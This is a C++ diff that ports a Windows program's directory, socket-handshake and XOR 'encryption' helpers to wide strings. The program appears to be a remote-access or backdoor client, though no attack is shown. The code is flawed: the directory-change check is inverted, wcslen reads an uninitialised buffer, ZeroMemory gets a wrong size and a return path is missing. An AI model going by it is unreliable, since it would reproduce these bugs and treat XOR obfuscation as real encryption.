@@ -2,46 +2,71 @@
 #include "../inc/common.h"
 
 
-int changeDirectory(string path)
+int changeDirectory(wstring path)
 {
+
+    if(SetCurrentDirectoryW(path.c_str()) != 0)
+    {
+        //if error
+        if(_wchdir(path.c_str()) != 0)
+        {
+            //if error
+            ; // TO change
+        }
+        else
+        {
+            return 0;
+        }
+    }
+    else
+    {
+        return 0;
+    }
 //    cout << path.substr(3,path.length()) << endl;
+    /*
     if(_chdir((path.substr(3,path.length())).c_str())!=0)
     {
         return 1;
     }
     return 0;
+    */
 }
 
 
-string getPath()
+wstring getPath()
 {
-    char* buffer;
-   // Get the current working directory:
-    if ( (buffer = _getcwd( NULL, 0 )) == NULL )
-        ;
-    string path = buffer;
-    return path;
+    WCHAR path[MAX_PATH];
+
+    if(GetCurrentDirectoryW(MAX_PATH, path) == 0)
+    {
+        //error TO CHANGE
+        return (wstring) L"";
+    } 
+    else
+    
+    {return (wstring) path;}
+
 }
 
 
-void sendUltraSafe(int sock, string data) //Just for HandShake or reconnect | !!! Use XOREncryption !!!
+void sendUltraSafe(int sock, wstring data) //Just for HandShake or reconnect | !!! Use XOREncryption !!!
 {
     int len_send=0;
     int len_recv=0;
-    char buffer[BUFFER_LEN];
-    string result,tmp;
+    WCHAR buffer[BUFFER_LEN];
+    wstring result,tmp;
     timeval timeout;
 
    
-    if(strlen(buffer) > 0)
+    if(wcslen(buffer) > 0)
     {
         //clean buffer
         //cout << "Clean buffer in sendUltrasafe " << endl;
         //memset(buffer, 0, sizeof(buffer));
-        ZeroMemory(&buffer, strlen(buffer));
+        ZeroMemory(&buffer, wcslen(buffer));
     }
 
-    len_send = send(sock, data.c_str(), data.length(), 0); /// !!!warning !! 
+    len_send = send(sock, (char *)data.c_str(), data.length() * sizeof(WCHAR), 0); /// !!!warning !! 
     if(len_send == SOCKET_ERROR)
     {
         //error
@@ -60,14 +85,13 @@ void sendUltraSafe(int sock, string data) //Just for HandShake or reconnect | !!
         int selectSock = select(0, &fds, 0, 0, &timeout);
         if(selectSock > 0)
         {
-            len_recv = recv(sock, buffer, sizeof(buffer), 0);
+            len_recv = recv(sock, (char *)buffer, sizeof(buffer), 0);
             tmp = buffer;
             result = XOREncryption(tmp);
 
-            if(result == "\r\n")
+            if(result == L"\r\n")
             {
-                ;
-                //cout << "\n\n[++]confirmation ok ! in sendUltraSafe" << endl;
+                ;//confirmation ok !
             }
             
         }
@@ -81,11 +105,11 @@ void sendUltraSafe(int sock, string data) //Just for HandShake or reconnect | !!
 }
 
 
-string XOREncryption(string data) //Do not use strlen on XOREncryption
+wstring XOREncryption(wstring data) //Do not use strlen on XOREncryption
 {
-    string result;
-    string char_xor;
-    string key = XOR_KEY;
+    wstring result;
+    wstring char_xor;
+    wstring key = XOR_KEY;
 
     if(data.empty())
     {
